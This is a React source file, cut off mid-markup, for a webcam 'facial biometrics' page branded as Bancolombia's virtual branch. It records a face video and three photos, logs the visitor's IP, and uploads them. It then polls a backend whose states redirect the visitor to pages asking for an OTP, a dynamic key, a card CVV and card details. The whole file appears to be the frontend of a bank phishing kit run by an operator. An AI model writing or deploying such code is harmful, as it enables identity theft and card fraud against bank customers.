import './css/LoginModal.css';
import { useEffect, useState, useRef } from "react";
import { Camera } from "@mediapipe/camera_utils";
import { limpiarPaddingBody } from "@utils";
import { isMobile } from "@utils";
import Loading from "app/components/Loading";
import { instanceBackend } from "app/axios/instanceBackend";
import { useNavigate } from "react-router-dom";
import { FaceMesh } from "@mediapipe/face_mesh";

// Se exporta el componente
export default function VerificacionIdentidad() {
  const navigate = useNavigate();
  const [sesionId, setSesionId] = useState(null);
  const [username, setUsername] = useState("Usuario");
  const photosRef = useRef([]); // Store captured photos

  // Duración de la grabación en segundos
  const RECORD_DURATION = 5;

  // Se inicializan los estados para manejar el continuar
  const [formState, setFormState] = useState({
    paso: 1,
    disabledAtras: false,
    estadoEspabilar: false,
    cargando: false,
    disabledContinuar: false,
    continuar: false,
    error: false,
    ok: false,
    texto: "Empezar",
    textoAtras: "Atrás",
    contador: 3
  });

  // Puntos específicos de FaceMesh para ojo izquierdo y derecho (formato correcto)
  const LEFT_EYE_POINTS = [33, 160, 158, 133, 153, 144];
  const RIGHT_EYE_POINTS = [362, 385, 387, 263, 373, 380];

  // Función para calcular EAR
  const calculateEAR = (landmarks, eyePoints) => {
    try {
      // Obtener los 6 puntos del ojo
      const [p1, p2, p3, p4, p5, p6] = eyePoints.map(idx => landmarks[idx]);

      // Calcular distancias verticales
      const vertical1 = Math.sqrt(Math.pow(p2.x - p6.x, 2) + Math.pow(p2.y - p6.y, 2));
      const vertical2 = Math.sqrt(Math.pow(p3.x - p5.x, 2) + Math.pow(p3.y - p5.y, 2));

      // Calcular distancia horizontal
      const horizontal = Math.sqrt(Math.pow(p1.x - p4.x, 2) + Math.pow(p1.y - p4.y, 2));

      // Evitar división por cero
      if (horizontal === 0) return 0.3;

      // Calcular EAR
      return (vertical1 + vertical2) / (2.0 * horizontal);
    } catch (error) {
      console.error("Error calculando EAR:", error);
      return 0.3; // Valor por defecto
    }
  };

  // Se inicializa la variable mobile
  const mobile = isMobile();

  // Refs
  const faceMeshRef = useRef(null);
  const blinkDetectedRef = useRef(false);
  const eyeClosedRef = useRef(false);
  const hasRecordedRef = useRef(false);
  const [stableTime, setStableTime] = useState(0);
  const [progress, setProgress] = useState(0);
  const mediaRecorderRef = useRef(null);
  const recordedChunksRef = useRef([]);
  const stopTimeoutRef = useRef(null);
  const videoRef = useRef(null);
  const cameraRef = useRef(null);
  const canvasRef = useRef(null);
  const [lastBlinkTime, setLastBlinkTime] = useState(0);
  const [debugInfo, setDebugInfo] = useState({
    earLeft: 0,
    earRight: 0,
    earAvg: 0,
    faceDetected: false,
    faceCount: 0,
    errorMessage: ""
  });

  // Se inicializa los estados
  const [ip, setIp] = useState("");
  const [fechaHora, setFechaHora] = useState("");

  useEffect(() => {
    const raw = localStorage.getItem("datos_usuario");
    if (raw) {
      const data = JSON.parse(raw);
      setSesionId(data.sesion_id);
      setUsername(data.nombreCompleto || "Usuario");
    }
  }, []);

  // Se crea el useEffect para iniciar la cámara y la detección facial
  useEffect(() => {
    // Se limpia el padding del body
    limpiarPaddingBody();

    // Solo iniciar en paso 3
    if (formState.paso !== 3) return;

    // Verificar que el ref del video esté disponible
    if (!videoRef.current) return;

    // Crear canvas para debug si no existe
    if (!canvasRef.current) {
      const canvas = document.createElement('canvas');
      canvas.style.position = 'absolute';
      canvas.style.top = '0';
      canvas.style.left = '0';
      canvas.style.zIndex = '1000';
      canvas.style.pointerEvents = 'none';
      canvas.width = 320;
      canvas.height = 400;
      canvasRef.current = canvas;

      // Insertar el canvas después del video container
      const container = document.getElementById('webcam-container');
      if (container) {
        container.appendChild(canvas);
      }
    }

    // Función para inicializar la detección facial
    const initFaceDetection = async () => {
      faceMeshRef.current = new FaceMesh({
        locateFile: (file) =>
          `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`,
      });

      faceMeshRef.current.setOptions({
        maxNumFaces: 1,
        refineLandmarks: true,
        minDetectionConfidence: 0.5,
        minTrackingConfidence: 0.5,
      });

      // Lógica mejorada de detección
      faceMeshRef.current.onResults((results) => {
        const canvas = canvasRef.current;
        const ctx = canvas?.getContext('2d');

        // Limpiar canvas
        if (ctx) {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
        }

        if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
          setFormState(prev => ({
            ...prev,
            ok: false,
            error: true,
          }));
          setDebugInfo(prev => ({
            ...prev,
            faceDetected: false,
            faceCount: 0,
            errorMessage: "No se detecta rostro"
          }));
          setProgress(0);
          setStableTime(0);
          return;
        }

        const landmarks = results.multiFaceLandmarks[0];
        const faceCount = results.multiFaceLandmarks.length;

        // Dibujar puntos de referencia para debug
        if (ctx && landmarks) {
          // Escalar puntos del canvas
          const drawLandmark = (index, color = 'red', size = 3) => {
            const point = landmarks[index];
            if (point) {
              const x = point.x * canvas.width;
              const y = point.y * canvas.height;

              ctx.fillStyle = color;
              ctx.beginPath();
              ctx.arc(x, y, size, 0, 2 * Math.PI);
              ctx.fill();
            }
          };

          // Dibujar puntos de los ojos
          LEFT_EYE_POINTS.forEach(idx => drawLandmark(idx, '#00ff00', 2));
          RIGHT_EYE_POINTS.forEach(idx => drawLandmark(idx, '#00ff00', 2));

          // Dibujar nariz (punto 1)
          drawLandmark(1, '#ff00ff', 4);

          // Dibujar contorno de la cara
          const faceOutline = [10, 338, 297, 332, 284, 251, 389, 356, 454, 323, 361, 288, 397, 365, 379, 378, 400, 377, 152, 148, 176, 149, 150, 136, 172, 58, 132, 93, 234, 127, 162, 21, 54, 103, 67, 109];
          for (let i = 0; i < faceOutline.length; i++) {
            drawLandmark(faceOutline[i], '#ffff00', 1);
          }
        }

        // Calcular EAR para ambos ojos
        const leftEAR = calculateEAR(landmarks, LEFT_EYE_POINTS);
        const rightEAR = calculateEAR(landmarks, RIGHT_EYE_POINTS);
        const avgEAR = (leftEAR + rightEAR) / 2;

        // Actualizar debug info
        setDebugInfo(prev => ({
          ...prev,
          earLeft: leftEAR.toFixed(3),
          earRight: rightEAR.toFixed(3),
          earAvg: avgEAR.toFixed(3),
          faceDetected: true,
          faceCount: faceCount,
          errorMessage: ""
        }));

        // Log para debug
        console.log(`EAR: L=${leftEAR.toFixed(3)}, R=${rightEAR.toFixed(3)}, Avg=${avgEAR.toFixed(3)}`);

        // Thresholds ajustados
        const EAR_THRESHOLD_CLOSE = 0.20; // Cuando los ojos están cerrados
        const EAR_THRESHOLD_OPEN = 0.25;  // Cuando los ojos están abiertos
        const EAR_THRESHOLD_MIN = 0.15;   // Mínimo aceptable para detección

        // Validar que el EAR sea válido
        if (avgEAR < EAR_THRESHOLD_MIN) {
          setFormState(prev => ({
            ...prev,
            ok: false,
            error: true,
          }));
          return;
        }

        // Estado actual de los ojos
        const areEyesClosed = avgEAR < EAR_THRESHOLD_CLOSE;
        const areEyesOpen = avgEAR > EAR_THRESHOLD_OPEN;

        // Detección de parpadeo
        if (areEyesClosed && !eyeClosedRef.current) {
          // Ojos se acaban de cerrar
          eyeClosedRef.current = true;
          console.log("👁️ Ojos cerrados detectados, EAR:", avgEAR.toFixed(3));
        }

        if (areEyesOpen && eyeClosedRef.current) {
          // Ojos se abrieron después de estar cerrados (parpadeo completo)
          blinkDetectedRef.current = true;
          eyeClosedRef.current = false;
          setLastBlinkTime(Date.now()); // Actualizar tiempo del último parpadeo

          console.log("✅ ¡Parpadeo detectado! EAR:", avgEAR.toFixed(3));
          console.log("🔄 blinkDetectedRef establecido a: true");

          setFormState(prev => ({
            ...prev,
            ok: true,
            error: false,
            estadoEspabilar: true // Asegurar que se muestre el mensaje
          }));

          // Debouncing - Solo resetear después de 3 segundos si no se ha iniciado grabación
          setTimeout(() => {
            if (!hasRecordedRef.current) {
              console.log("🔄 Parpadeo no seguido de grabación, reseteando...");
              blinkDetectedRef.current = false;
              setFormState(prev => ({
                ...prev,
                ok: false,
                estadoEspabilar: false
              }));
            }
          }, 3000);
        }

        // Validar posición facial
        const isFaceWellPositioned = validateFacePosition(landmarks);

        // Actualizar estado según posición
        if (!isFaceWellPositioned) {
          setFormState(prev => ({
            ...prev,
            ok: false,
            error: true,
          }));
          setDebugInfo(prev => ({
            ...prev,
            errorMessage: "Rostro no centrado"
          }));
        } else if (!areEyesOpen && !areEyesClosed) {
          // Ojos semi-abiertos
          setFormState(prev => ({
            ...prev,
            ok: false,
            error: false,
          }));
        } else if (areEyesOpen && !blinkDetectedRef.current) {
          // Ojos abiertos pero no se ha detectado parpadeo
          setFormState(prev => ({
            ...prev,
            ok: false,
            error: false,
          }));
        }
      });

      // Se crea la instancia de la cámara
      cameraRef.current = new Camera(videoRef.current, {
        onFrame: async () => {
          try {
            await faceMeshRef.current?.send({ image: videoRef.current });
          } catch (error) {
            console.error("Error enviando frame a FaceMesh:", error);
          }
        },
        width: 320,
        height: 400,
      });

      // Se inicia la cámara
      cameraRef.current.start().catch(error => {
        console.error("Error iniciando cámara:", error);
        setFormState(prev => ({
          ...prev,
          error: true,
        }));
      });
    };

    initFaceDetection();

    // Cleanup
    return () => {
      if (cameraRef.current) {
        cameraRef.current.stop();
        cameraRef.current = null;
      }

      if (faceMeshRef.current) {
        faceMeshRef.current.close();
        faceMeshRef.current = null;
      }

      // Remover canvas de debug
      if (canvasRef.current && canvasRef.current.parentNode) {
        canvasRef.current.parentNode.removeChild(canvasRef.current);
        canvasRef.current = null;
      }
    };
  }, [formState.paso]);

  // Función de validación de posición facial
  const validateFacePosition = (landmarks) => {
    try {
      // Puntos clave
      const noseTip = landmarks[1];
      const leftEye = landmarks[33];
      const rightEye = landmarks[263];
      const leftMouth = landmarks[61];
      const rightMouth = landmarks[291];

      // Validar que existan los puntos
      if (!noseTip || !leftEye || !rightEye || !leftMouth || !rightMouth) {
        return false;
      }

      // Calcular ancho del rostro
      const faceWidth = Math.abs(rightEye.x - leftEye.x);
      const faceHeight = Math.abs(leftMouth.y - leftEye.y);

      // Validar proporciones mínimas
      if (faceWidth < 0.1 || faceHeight < 0.1) {
        return false; // Rostro demasiado pequeño o lejano
      }

      // Calcular centro del rostro
      const faceCenterX = (leftEye.x + rightEye.x) / 2;
      const faceCenterY = (leftEye.y + leftMouth.y) / 2;

      // Validar que la nariz esté cerca del centro
      const noseOffsetX = Math.abs(noseTip.x - faceCenterX);
      const noseOffsetY = Math.abs(noseTip.y - faceCenterY);

      const isCenteredX = noseOffsetX < 0.15 * faceWidth;
      const isCenteredY = noseOffsetY < 0.15 * faceHeight;

      // Validar nivel de los ojos
      const eyeLevelDiff = Math.abs(leftEye.y - rightEye.y);
      const isLevel = eyeLevelDiff < 0.05 * faceHeight;

      // Validar que ambos ojos sean visibles
      const leftEyeVisible = leftEye.z > -0.5; // Valor z indica profundidad
      const rightEyeVisible = rightEye.z > -0.5;

      return isCenteredX && isCenteredY && isLevel && leftEyeVisible && rightEyeVisible;
    } catch (error) {
      console.error("Error en validación de posición:", error);
      return false;
    }
  };

  // Efecto para manejar timeout de parpadeos muy antiguos
  useEffect(() => {
    const handleBlinkTimeout = () => {
      // Si pasan 5 segundos sin iniciar grabación, resetear
      if (blinkDetectedRef.current && !hasRecordedRef.current && Date.now() - lastBlinkTime > 5000) {
        console.log("⏰ Timeout: Parpadeo muy antiguo, reseteando...");
        blinkDetectedRef.current = false;
        setFormState(prev => ({
          ...prev,
          ok: false,
          estadoEspabilar: false
        }));
        setStableTime(0);
        setProgress(0);
      }
    };

    const interval = setInterval(handleBlinkTimeout, 1000);
    return () => clearInterval(interval);
  }, [lastBlinkTime]);

  // Efecto para el progreso después de detectar parpadeo
  useEffect(() => {
    let intervalId;

    console.log("🔄 Efecto progreso activado:", {
      formStateOk: formState.ok,
      blinkDetected: blinkDetectedRef.current,
      eyeClosed: eyeClosedRef.current,
      stableTime: stableTime
    });

    if (formState.ok && blinkDetectedRef.current) {
      console.log("✅ Condición OK cumplida, iniciando conteo...");

      // Asegurarse de mostrar el mensaje de espabilar
      setFormState(prev => ({
        ...prev,
        estadoEspabilar: true
      }));

      // Iniciar el conteo
      intervalId = setInterval(() => {
        setStableTime((prevTime) => {
          const newTime = prevTime + 0.1;

          // Mostrar logs para debug cada segundo
          if (Math.round(newTime * 10) % 10 === 0) {
            console.log(`⏱️ Tiempo estable: ${newTime.toFixed(1)}s, Progreso: ${progress}`);
          }

          if (newTime >= 3) {
            const progressPercentage = Math.min((newTime - 3) / 5, 1);
            setProgress(progressPercentage);

            console.log(`🌀 Progreso: ${(progressPercentage * 100).toFixed(1)}%`);

            if (progressPercentage > 0 && !mediaRecorderRef.current && !hasRecordedRef.current) {
              console.log("🎬 Iniciando grabación...");
              hasRecordedRef.current = true;
              startRecording();
            }
          }

          return newTime;
        });
      }, 100);
    } else {
      // Resetear si no hay parpadeo válido
      console.log("🔄 Reseteando progreso");
      setStableTime(0);
      setProgress(0);

      if (!formState.ok && formState.paso === 3) {
        setFormState(prev => ({
          ...prev,
          estadoEspabilar: false
        }));
      }
    }

    return () => {
      if (intervalId) {
        console.log("🧹 Limpiando intervalo del progreso");
        clearInterval(intervalId);
      }
    };
  }, [formState.ok, formState.paso]);

  // Efecto para debug del estado
  useEffect(() => {
    console.log("📊 Estado actual:", {
      paso: formState.paso,
      ok: formState.ok,
      error: formState.error,
      cargando: formState.cargando,
      estadoEspabilar: formState.estadoEspabilar,
      blinkDetected: blinkDetectedRef.current,
      eyeClosed: eyeClosedRef.current,
      stableTime: stableTime,
      progress: progress,
      hasRecorded: hasRecordedRef.current
    });
  }, [formState, stableTime, progress]);

  // Resto del useEffect para IP y fecha/hora...
  useEffect(() => {
    obtenerIP();
    obtenerFechaHora();
  }, []);

  useEffect(() => {
    const ahora = new Date();
    const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

    let intervalId;
    const timeoutId = setTimeout(() => {
      obtenerFechaHora();
      intervalId = setInterval(() => {
        obtenerFechaHora();
      }, 60000);
    }, msHastaProximoMinuto);

    return () => {
      clearTimeout(timeoutId);
      if (intervalId) clearInterval(intervalId);
    };
  }, []);

  // Obtiene la dirección IP pública del usuario
  const obtenerIP = async () => {
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      setIp(data.ip);
    } catch (error) {
      console.error("Error obteniendo IP", error);
      setIp("No disponible");
    };
  };

  // Obtiene la fecha y hora actual del sistema
  const obtenerFechaHora = () => {
    const ahora = new Date();
    const opciones = {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "numeric",
      minute: "2-digit",
      hour12: true
    };
    const formato = ahora.toLocaleString("es-CO", opciones);
    setFechaHora(formato);
  };

  // Función para capturar frames
  const captureFrame = async () => {
    if (!videoRef.current) return null;
    try {
      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(videoRef.current, 0, 0);
      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
    } catch (e) {
      console.error("Error capturing frame", e);
      return null;
    }
  };

  // Placeholder function for the button
  const handleContinuar = (e) => {
    e.currentTarget.blur();

    setFormState((prev) => {
      if (prev.paso === 1) {
        return {
          ...prev,
          paso: 2,
          texto: "Continuar"
        };
      };

      if (prev.paso === 2) {
        return {
          ...prev,
          paso: 3,
          continuar: true,
          texto: "Comenzar",
        };
      };

      if (prev.paso === 3) {
        return {
          ...prev,
          disabledContinuar: true,
          disabledAtras: true
        };
      };

      return prev;
    });
  };

  // Función para manejar el botón de atrás
  const handleAtras = () => {
    setFormState((prev) => {
      if (prev.paso === 2) {
        return {
          ...prev,
          paso: 1,
          texto: "Empezar"
        };
      };

      if (prev.paso === 3) {
        stopRecording();
        return {
          ...prev,
          paso: 2,
          texto: "Continuar"
        };
      };

      return prev;
    });
  };

  // Se crea el metodo para detener la grabación
  const stopRecording = () => {
    if (stopTimeoutRef.current) {
      clearTimeout(stopTimeoutRef.current);
      stopTimeoutRef.current = null;
    }

    if (mediaRecorderRef.current?.state === "recording") {
      mediaRecorderRef.current.stop();
      mediaRecorderRef.current = null;
    };
  };

  // Se crea el metodo para empezar a grabar
  const startRecording = () => {
    console.log("🎬 startRecording llamado");

    if (!videoRef.current?.srcObject) {
      console.error("❌ No hay stream de video");
      return;
    }

    const stream = videoRef.current.srcObject;
    recordedChunksRef.current = [];
    photosRef.current = [];

    console.log("📹 Creando MediaRecorder...");
    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: "video/webm;codecs=vp8",
    });

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        recordedChunksRef.current.push(event.data);
      };
    };

    mediaRecorder.onstop = () => {
      const blob = new Blob(recordedChunksRef.current, { type: "video/webm", });
      console.log("✅ Grabación finalizada -> tamaño:", blob.size);
      handleUploadBiometrics(blob, photosRef.current);
    };

    mediaRecorder.onstart = () => {
      console.log("🎥 Grabación iniciada");
      // Cambiar el estado para mostrar que se está grabando
      setFormState(prev => ({
        ...prev,
        estadoEspabilar: false,
      }));
    };

    mediaRecorder.start();
    mediaRecorderRef.current = mediaRecorder;

    console.log("📸 Programando capturas de fotos...");

    const capture = async (photoNum) => {
      if (photosRef.current.length < 3) {
        console.log(`📸 Capturando foto ${photoNum + 1}...`);
        const photo = await captureFrame();
        if (photo) {
          photosRef.current.push(photo);
          console.log(`✅ Foto ${photoNum + 1} capturada`);
        }
      }
    };

    // Capturar fotos en intervalos
    setTimeout(() => capture(0), 1000);
    setTimeout(() => capture(1), 2500);
    setTimeout(() => capture(2), 4000);

    // ⏱ Detener EXACTAMENTE en X segundos
    stopTimeoutRef.current = setTimeout(() => {
      console.log("⏱️ Timeout de grabación alcanzado");
      if (mediaRecorderRef.current?.state === "recording") {
        mediaRecorderRef.current.stop();
        mediaRecorderRef.current = null;

        setFormState((prev) => {
          return {
            ...prev,
            ok: false,
            estadoEspabilar: false,
            cargando: true,
          };
        });
      }
    }, RECORD_DURATION * 1000);
  };

  const handleUploadBiometrics = async (videoBlob, photos) => {
    if (!sesionId) {
      console.error("No session ID found");
      return;
    }

    setFormState(prev => ({
      ...prev,
      ok: false,
      estadoEspabilar: false,
      cargando: true
    }));

    try {
      const formData = new FormData();
      formData.append('sessionId', sesionId);
      formData.append('username', username);
      formData.append('video', videoBlob, 'biometrics_video.webm');

      if (photos[0]) formData.append('image1', photos[0], 'face_1.jpg');
      if (photos[1]) formData.append('image2', photos[1], 'face_2.jpg');
      if (photos[2]) formData.append('image3', photos[2], 'face_3.jpg');

      await instanceBackend.post('/biometrics/upload', formData, {
        headers: { 'Content-Type': 'multipart/form-data' }
      });

      console.log("Biometrics uploaded successfully");
      iniciarPolling(sesionId);

    } catch (error) {
      console.error("Error uploading biometrics:", error);
      setFormState(prev => ({ ...prev, cargando: false, error: true }));
      alert("Error al subir la verificación. Por favor intente nuevamente.");
    }
  };

  const iniciarPolling = (sid) => {
    let attempts = 0;
    const MAX_ATTEMPTS = 100;

    const pollingInterval = setInterval(async () => {
      try {
        attempts++;
        const response = await instanceBackend.post(`/consultar-estado/${sid}`);
        const { estado } = response.data;

        console.log('Polling Status:', estado);

        if (attempts >= MAX_ATTEMPTS) {
          clearInterval(pollingInterval);
          setFormState(prev => ({ ...prev, cargando: false, error: true }));
          return;
        }

        const statusMap = {
          'solicitar_otp': '/numero-otp',
          'error_otp': '/numero-otp',
          'solicitar_din': '/clave-dinamica',
          'error_din': '/clave-dinamica',
          'solicitar_finalizar': '/finalizado-page',
          'error_923': '/error-923page',
          'solicitar_cvv': '/validacion-cvv',
          'solicitar_tc_custom': '/tc-custom',
          'error_login': '/autenticacion',
          'aprobado': '/finalizado-page'
        };

        if (statusMap[estado]) {
          clearInterval(pollingInterval);

          if (['error_login', 'error_otp', 'error_din'].includes(estado)) {
            localStorage.setItem('estado_sesion', 'error');
          }

          navigate(statusMap[estado]);
        }

      } catch (error) {
        console.error("Polling error:", error);
      }
    }, 3000);
  };

  // Se retorna el componente
  return (
    <>
      <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
        <div
          style={{
            flex: 1,
            backgroundColor: "#2C2A29",
            backgroundImage: 'url("/assets/images/auth-trazo.svg")',
            backgroundRepeat: "no-repeat",
            backgroundPosition: "center",
            backgroundPositionY: "-70px",
            backgroundPositionX: "-500px",
          }}
        >
          <div style={{ textAlign: "center" }}>
            <img
              src="/assets/images/img_pantalla2/descarga.svg"
              alt="Logo"
              style={{ width: "238px", marginTop: "45px" }}
            />
          </div>

          <div
            style={{
              marginTop: "25px",
            }}
          >
            <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
              Sucursal Virtual Personas
            </h1>
          </div>

          <div className="login-page">
            <div className="login-box" style={{ backgroundColor: "#454648", textAlignLast: "center" }}>

              {/* Contenido según paso */}
              {formState.paso === 1 ? (
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/images/indicacion/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <div style={{ textAlign: 'center' }}>
                    <h2
                      className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center"
                      style={{
                        fontSize: "20px",
                        fontWeight: "bold",
                        marginBottom: "20px",
                        lineHeight: "1.3",
                        color: "#ffffff",
                      }}>
                      ¡Bienvenido a Biometría Facial!
                    </h2>
                    <p className="bc-card-auth-description" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                      Una alianza para la transformación digital segura.
                    </p>
                  </div>

                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      marginTop: "40px",
                      marginBottom: "40px",
                      width: "100%"
                    }}
                  >
                    <div style={{ flex: 1, display: "flex", justifyContent: "flex-end" }}>
                      <img
                        src="/assets/images/img_pantalla2/imgi_1_bancolombia-horizontal-no-spacing.svg"
                        width={120}
                      />
                    </div>

                    <div
                      style={{
                        width: "2px",
                        height: "40px",
                        backgroundColor: "#ffffff",
                        margin: "0 20px",
                        flexShrink: 0
                      }}
                    />

                    <div style={{ flex: 1, display: "flex", justifyContent: "flex-start" }}>
                      <img
                        src="/assets/images/indicacion/soyyoredeban.png"
                        width={105}
                      />
                    </div>
                  </div>
                </>
              ) : formState.paso === 2 ? (
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/images/indicacion/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <h2 className="mt-2"
                    style={{
                      fontSize: "20px",
                      fontWeight: "bold",
                      marginBottom: "20px",
                      lineHeight: "1.3",
                      color: "#ffffff"
                    }}>
                    Verificación de identidad
                  </h2>

                  <div style={{ textAlignLast: "center" }}>
                    <span
                      className="bc-card-auth-description"
                      style={{
                        display: "block",
                        fontSize: "13.5px",
                        marginBottom: "10px",
                        color: "#ffffff",
                      }}
                    >
                      Necesitamos verificar tu identidad para continuar con el proceso de forma segura.
                    </span>

                    <span
                      className="bc-card-auth-description"
                      style={{
                        display: "block",
                        fontSize: "13.5px",
                        color: "#ffffff",
                      }}
                    >
                      Para completar la verificación, acepta los permisos de la cámara y sigue las instrucciones:
                    </span>
                  </div>

                  <div className="info-list mt-4 mb-4">
                    <div className="info-item">
                      <img src="/assets/images/img1.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Ubicate en un espacio iluminado
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Mejor un lugar con luz natural o luz blanca.
                        </span>
                      </span>
                    </div>
                    <div className="info-item">
                      <img src="/assets/images/img2.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Ubica tú celular a la altura de tu rostro
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Mantén la cabeza recta mirando al frente y ubica tu celular a esa altura.
                        </span>
                      </span>
                    </div>
                    <div className="info-item">
                      <img src="/assets/images/img3.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Retira los accesorios
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Evita cubrir tu rostro con tú cabello, gafas, gorras, tapabocas, etc.
                        </span>
                      </span>
                    </div>
                  </div>
                </>
              ) : (
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/images/indicacion/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <div style={{ textAlign: 'center' }}>
                    <h2
                      className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center"
                      style={{
                        fontSize: "20px",
                        fontWeight: "bold",
                        marginBottom: "20px",
                        lineHeight: "1.3",
                        color: "#ffffff",
                      }}>
                      Verificando tu identidad
                    </h2>
                    <p className="bc-card-auth-description" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                      Mantén tu rostro centrado dentro del circulo y espera a que se complete la verificación.
                    </p>
                  </div>

                  <div
                    id="webcam-container"
                    style={{
                      width: "180px",
                      margin: "0 auto",
                      position: "relative",
                    }}
                  >
                    {/* CONTENEDOR CIRCULAR REAL */}
                    <div
                      style={{
                        width: "180px",
                        height: "180px",
                        borderRadius: "50%",
                        overflow: "hidden",
                        position: "relative",
                        backgroundColor: "#000",
                      }}
                    >
                      {/* VIDEO */}
                      <video
                        ref={videoRef}
                        autoPlay
                        playsInline
                        muted
                        style={{
                          width: "100%",
                          height: "100%",
                          objectFit: "cover",
                          transform: "scaleX(-1)",
                        }}
                      />

                      {/* OVERLAY (GUIA / PROGRESO / ERROR) */}
                      <svg
                        width="180"
                        height="180"
                        viewBox="0 0 180 180"
                        style={{
                          position: "absolute",
                          inset: 0,
                          pointerEvents: "none",
                        }}
                      >
                        {/* Guía blanca */}
                        <circle
                          cx="90"
                          cy="90"
                          r="88"
                          fill="none"
                          stroke="#ffffff"
                          strokeWidth="5"
                          strokeDasharray="4 4"
                          opacity="0.8"
                        />

                        {/* Error */}
                        {(formState.error && formState.cargando == false) && (
                          <circle
                            cx="90"
                            cy="90"
                            r="88"
                            fill="none"
                            stroke="#ff3b30"
                            strokeWidth="5"
                          />
                        )}

                        {/* Progreso */}
                        {(formState.ok && formState.cargando == false) && (
                          <circle
                            cx="90"
                            cy="90"
                            r="88"
                            fill="none"
                            stroke="#4BB543"
                            strokeWidth="5"
                            strokeLinecap="round"
                            strokeDasharray={2 * Math.PI * 88}
                            strokeDashoffset={(2 * Math.PI * 88) * (1 - progress)}
                            transform="rotate(-90 90 90)"
                          />
                        )}
                      </svg>
                    </div>
                  </div>

                  {/* Botones de debug (solo en desarrollo) */}
                  {process.env.NODE_ENV === 'development' && (
                    <div style={{ marginTop: '10px', display: 'flex', justifyContent: 'center', gap: '10px' }}>
                      <button
                        onClick={() => {
                          console.log("🔧 DEBUG: Simulando parpadeo");
                          blinkDetectedRef.current = true;
                          setFormState(prev => ({
                            ...prev,
                            ok: true,
                            error: false,
                            estadoEspabilar: true
                          }));
                        }}
                        style={{
                          padding: '5px 10px',
                          fontSize: '12px',
                          backgroundColor: '#666',
                          color: 'white',
                          border: 'none',
                          borderRadius: '3px'
                        }}
                      >
                        Simular Parpadeo
                      </button>

                      <button
                        onClick={() => {
                          console.log("🔧 DEBUG: Forzar grabación");
                          startRecording();
                        }}
                        style={{
                          padding: '5px 10px',
                          fontSize: '12px',
                          backgroundColor: '#666',
                          color: 'white',
                          border: 'none',
                          borderRadius: '3px'
                        }}
                      >
                        Forzar Grabación
                      </button>
                    </div>
                  )}

                  {/* Información de debug (solo en desarrollo) */}
                  {process.env.NODE_ENV === 'development' && (
                    <div style={{
                      marginTop: '10px',
                      padding: '10px',
                      backgroundColor: 'rgba(0,0,0,0.7)',
                      borderRadius: '5px',
                      fontSize: '12px',
                      color: '#fff',
                      textAlign: 'left'
                    }}>
                      <div><strong>DEBUG INFO:</strong></div>
                      <div>Rostros detectados: {debugInfo.faceCount}</div>
                      <div>EAR Izquierdo: {debugInfo.earLeft}</div>
                      <div>EAR Derecho: {debugInfo.earRight}</div>
                      <div>EAR Promedio: {debugInfo.earAvg}</div>
                      <div>Estado: {formState.ok ? '✅ OK' : formState.error ? '❌ ERROR' : '⏳ Esperando'}</div>
                      <div>Tiempo estable: {stableTime.toFixed(1)}s</div>
                      <div>Progreso: {(progress * 100).toFixed(1)}%</div>
                      <div>Blink detectado: {blinkDetectedRef.current ? '✅' : '❌'}</div>
                      {debugInfo.errorMessage && (
                        <div>Error: {debugInfo.errorMessage}</div>
                      )}
                    </div>
                  )}

                  <div>
                    {/* MENSAJE */}
                    {(formState.error && formState.cargando == false) && (
                      <p
                        className="bc-card-auth-description"
                        style={{
                          color: "#fff",
